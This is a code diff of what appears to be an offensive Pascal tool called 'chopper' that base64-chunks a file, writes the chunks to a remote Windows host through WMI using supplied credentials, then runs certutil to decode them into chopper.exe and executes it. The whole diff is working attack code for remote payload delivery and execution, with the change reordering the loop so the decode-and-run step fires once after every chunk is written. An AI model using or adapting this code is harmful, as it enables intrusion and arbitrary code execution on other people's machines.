@@ -520,7 +520,7 @@ begin
     end;
     filetobase64(filename,res);
 
-
+ end;
 // loop becomes here
 len := length(res);
 numelem := len div 150;
@@ -534,15 +534,18 @@ Arr[p] := copy(res,p * 150 + 1, 150);
 
 for p := 0 to High (arr) do begin
 
-process := 'c:\windows\system32\cmd.exe /c powershell.exe -command "'''+Arr[p]+''' |out-file -append c:\Users\Public\testman.txt"';
+process := 'c:\windows\system32\cmd.exe /c powershell.exe -command "'''+Arr[p]+''' |out-file -append c:\Users\Public\chop.enc"';
 writeln(process);
 smuggle_wmi(username,password,host,process);
-sleep(1);
-smuggle_wmi(username,password,host,'c:\windows\system32\cmd.exe /c certutil -decode -f c:\Users\Public\testman.txt c:\Users\Public\chopper.exe & c:\Users\Public\chopper.exe');
+end;
+writeln('[+] Prepare to execute ');
+sleep(1000);
+
+smuggle_wmi(username,password,host,'c:\windows\system32\cmd.exe /c certutil -decode -f c:\Users\Public\chop.enc c:\Users\Public\chopper.exe & c:\Users\Public\chopper.exe');
+
 
 end;
-end;
-  end;
+
 procedure Tchopper.usage;
 begin
 banner;
